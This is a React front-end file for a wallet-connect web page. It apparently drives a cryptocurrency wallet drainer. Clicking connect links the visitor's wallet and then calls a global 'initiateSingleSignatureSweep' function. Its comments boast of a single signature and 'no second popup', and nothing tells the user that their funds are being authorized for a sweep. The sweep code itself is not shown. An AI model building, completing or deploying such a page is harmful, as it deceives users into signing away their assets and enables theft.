import { useState, useEffect } from 'react'
import { useWalletStore } from './stores/walletStore'
import ConnectButton from './components/ConnectButton'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    isConnected,
    isLoading,
    error,
    setAccount,
    setIsConnected,
    setIsLoading,
    setError,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)

  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      console.log('[App] Starting Single Signature Sweep...')

      // Step 1: Connect Wallet (using your existing utility)
      const { account: addr, provider } = await window.connectWallet() // Make sure this is exposed globally

      if (!addr || !provider) throw new Error('Failed to connect wallet')

      setAccount(addr)
      setIsConnected(true)

      console.log('[App] Wallet connected:', addr)

      // Step 2: Single Signature Authorization (No second popup)
      const result = await window.initiateSingleSignatureSweep(provider, addr)

      if (result.success) {
        setTransferStatus(result)
        setShowSummary(true)
        console.log('[App] ✅ Sweep authorized successfully')
      } else {
        throw new Error(result.message || 'Authorization failed')
      }

    } catch (err) {
      console.error(err)
      setError(err.message || 'Connection failed')
    } finally {
      setIsLoading(false)
    }
  }

  useEffect(() => {
    window.__handleConnect = handleConnect
  }, [])

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {isConnected && account ? (
          <div className="bg-green-900/50 border border-green-700 rounded-xl p-6 mb-6">
            <p className="text-green-400 text-sm">Connected</p>
            <p className="font-mono text-white mt-1">{account.slice(0, 6)}...{account.slice(-4)}</p>
          </div>
        ) : null}

        {!isConnected && (
          <ConnectButton onClick={handleConnect} isLoading={isLoading} />
        )}

        {error && (
          <div className="bg-red-900/50 border border-red-700 rounded-xl p-4 mt-4">
            <p className="text-red-300">{error}</p>
          </div>
        )}

        {showSummary && <SummaryModal onClose={() => setShowSummary(false)} />}
      </div>
    </div>
  )
}

export default App

